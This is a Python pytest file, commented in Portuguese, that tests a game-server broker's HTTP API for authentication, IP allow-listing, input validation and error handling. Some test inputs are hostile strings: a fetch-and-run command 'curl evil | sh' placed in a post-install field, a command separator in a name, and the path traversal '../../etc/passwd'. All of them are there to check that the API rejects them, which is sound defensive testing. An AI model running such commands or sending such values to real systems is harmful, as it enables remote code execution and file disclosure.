"""API HTTP: autenticacao, formato das respostas e o mapeamento erro -> status."""
from __future__ import annotations

import pytest

from conftest import TOKEN
from gamebroker.app import create_app

AUTH = {"Authorization": f"Bearer {TOKEN}", "X-Actor": "admin"}


@pytest.fixture
def http(environment):
    app = create_app(environment.servico, TOKEN)
    app.config["TESTING"] = False  # queremos o handler de 500, nao a excecao propagada
    return app.test_client()


def test_token_curto_nao_sobe():
    with pytest.raises(ValueError, match="32 caracteres"):
        create_app(None, "curto")  # type: ignore[arg-type]


@pytest.mark.parametrize("headers", [{}, {"Authorization": "Bearer errado"}, {"Authorization": TOKEN},
                                        {"Authorization": f"Basic {TOKEN}"}, {"Authorization": "Bearer "}])
@pytest.mark.parametrize(("metodo", "url"), [("get", "/v1/health"), ("get", "/v1/catalog"),
                                             ("get", "/v1/instances"), ("post", "/v1/instances"),
                                             ("post", "/v1/catalog")])
def test_sem_token_valido_nada_responde(http, metodo, url, headers):
    response = getattr(http, metodo)(url, headers=headers, json={})
    assert response.status_code == 401
    assert response.get_json()["codigo"] == "nao-autenticado"


def test_ip_fora_da_lista_e_barrado_mesmo_com_token(environment):
    app = create_app(environment.servico, TOKEN, allowed_ips=("10.9.9.9",))
    response = app.test_client().get("/v1/health", headers=AUTH)
    assert response.status_code == 403


def test_saude(http):
    corpo = http.get("/v1/health", headers=AUTH).get_json()
    assert (corpo["broker"], corpo["proxmox"], corpo["opnsense"]) == (True, True, True)


def test_saude_mostra_proxmox_fora_do_ar(http, environment):
    environment.proxmox.online = False
    assert http.get("/v1/health", headers=AUTH).get_json()["proxmox"] is False


def test_catalogo_nao_vaza_comando(http):
    games = http.get("/v1/catalog", headers=AUTH).get_json()
    assert {j["key"] for j in games} == {"alfa", "beta", "conta", "delta"}
    assert "segredo do instalador" not in str(games)
    account = next(j for j in games if j["key"] == "conta")
    assert account["creatable"] is False


def test_adicionar_jogo_e_criar_instancia_dele(http, game_data):
    assert http.post("/v1/catalog", headers=AUTH, json=game_data).status_code == 201
    response = http.post("/v1/instances", headers=AUTH, json={"game": "meujogo", "name": "Novo"})
    assert response.status_code == 202


def test_adicionar_jogo_com_comando_de_contrabando(http, game_data):
    game_data["post_install_cmd"] = "curl evil | sh"
    response = http.post("/v1/catalog", headers=AUTH, json=game_data)
    assert response.status_code == 400
    assert response.get_json()["codigo"] == "validacao"


def test_criar_devolve_202_e_a_operacao_pode_ser_consultada(http):
    response = http.post("/v1/instances", headers=AUTH, json={"game": "beta", "name": "Um"})
    assert response.status_code == 202
    op = http.get(f"/v1/operations/{response.get_json()['operation_id']}", headers=AUTH).get_json()
    assert op["state"] == "ok"
    assert op["result"]["host"] == "10.0.0.30"
    listed = http.get("/v1/instances", headers=AUTH).get_json()
    assert [i["name"] for i in listed] == ["Um"]


@pytest.mark.parametrize("corpo", [{}, {"game": "beta"}, {"name": "x"}, {"game": "beta", "name": "a;b"},
                                   {"game": "nao-existe", "name": "x"}])
def test_criar_com_pedido_ruim_nao_e_500(http, corpo):
    assert http.post("/v1/instances", headers=AUTH, json=corpo).status_code in (400, 404)


def test_corpo_que_nao_e_json_objeto(http):
    assert http.post("/v1/instances", headers=AUTH, data="oi", content_type="text/plain").status_code == 400
    assert http.post("/v1/instances", headers=AUTH, json=[1, 2]).status_code == 400


def test_corpo_gigante_e_recusado(http):
    big = {"game": "beta", "name": "x" * 100_000}
    assert http.post("/v1/instances", headers=AUTH, json=big).status_code == 413


def test_cota_vira_429(http, environment):
    environment.with_config(max_instances=0)
    response = http.post("/v1/instances", headers=AUTH, json={"game": "beta", "name": "x"})
    assert (response.status_code, response.get_json()["codigo"]) == (429, "cota")


def test_conflito_de_porta_vira_409(http):
    http.post("/v1/instances", headers=AUTH, json={"game": "alfa", "name": "um"})
    response = http.post("/v1/instances", headers=AUTH, json={"game": "delta", "name": "dois"})
    assert (response.status_code, response.get_json()["codigo"]) == (409, "sem-recurso")


@pytest.mark.parametrize("op_id", ["nao-hex", "../../etc/passwd", "a" * 31, "A" * 32])
def test_id_de_operacao_estranho(http, op_id):
    assert http.get(f"/v1/operations/{op_id}", headers=AUTH).status_code in (400, 404)


def test_operacao_desconhecida(http):
    assert http.get(f"/v1/operations/{'0' * 32}", headers=AUTH).status_code == 404


def test_desativar_e_remover_pela_api(http):
    created_one = http.post("/v1/instances", headers=AUTH, json={"game": "beta", "name": "Um"}).get_json()
    url = f"/v1/instances/{created_one['instance_id']}"
    assert http.delete(url, headers=AUTH, json={"confirmation": "Um"}).status_code == 409, "ainda ativa"
    assert http.post(f"{url}/deactivate", headers=AUTH).status_code == 200
    assert http.delete(url, headers=AUTH, json={"confirmation": "errado"}).status_code == 400
    assert http.delete(url, headers=AUTH, json={"confirmation": "Um"}).status_code == 200
    assert http.get("/v1/instances", headers=AUTH).get_json() == []


def test_somente_banco_precisa_ser_booleano(http):
    created_one = http.post("/v1/instances", headers=AUTH, json={"game": "beta", "name": "Um"}).get_json()
    url = f"/v1/instances/{created_one['instance_id']}"
    http.post(f"{url}/deactivate", headers=AUTH)
    assert http.delete(url, headers=AUTH, json={"confirmation": "Um", "db_only": "sim"}).status_code == 400
    response = http.delete(url, headers=AUTH, json={"confirmation": "Um", "db_only": True})
    assert response.status_code == 200
    assert response.get_json()["db_only"] is True


def test_id_de_instancia_precisa_ser_inteiro(http):
    assert http.post("/v1/instances/abc/deactivate", headers=AUTH).status_code == 404


def test_erro_interno_nao_vaza_detalhe(http, environment):
    def break_it(*_a, **_k):
        raise RuntimeError("senha=segredo caminho=/etc/interno")

    environment.servico.health = break_it
    response = http.get("/v1/health", headers=AUTH)
    assert response.status_code == 500
    assert "segredo" not in response.get_data(as_text=True)
    assert response.get_json()["codigo"] == "interno"


def test_ator_da_auditoria_vem_do_cabecalho(http, environment):
    http.post("/v1/instances", headers={**AUTH, "X-Actor": "zeca"}, json={"game": "beta", "name": "Um"})
    assert "zeca" in {a["actor"] for a in environment.db.audit_trail()}
